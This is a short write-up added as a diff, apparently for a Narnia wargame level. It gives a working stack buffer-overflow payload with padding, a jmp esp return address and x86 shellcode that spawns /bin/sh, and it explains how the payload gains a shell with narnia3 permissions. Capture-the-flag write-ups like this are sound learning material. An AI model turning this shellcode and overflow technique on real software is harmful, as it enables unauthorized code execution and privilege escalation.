@@ -1,0 +1,16 @@
+Basic buffer overflow into shellcode using strcpy.
+
+Buffersize is 128, with 4 bytes before the ret address is assigned.
+________________________________________________________________________________________________________________________________________________________________
+payload = b'A'*132 + b'\x03\x8a\xfb\xf7'+ b'\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
+print(payload)
+________________________________________________________________________________________________________________________________________________________________
+
+
+
+The stack when this payload is copied in will contain the overwritten return address, as well as shellcode of our choice.
+
+Since the shellcode is written into the space IMMEDIATELY after the return address in the stack (below ESP), by supplementing the return address with an instruction (jmp esp) you can move straight back
+to the shellcode without actually knowing the memory address.
+
+Then the payload executes! We have a shell with narnia3 permissions!
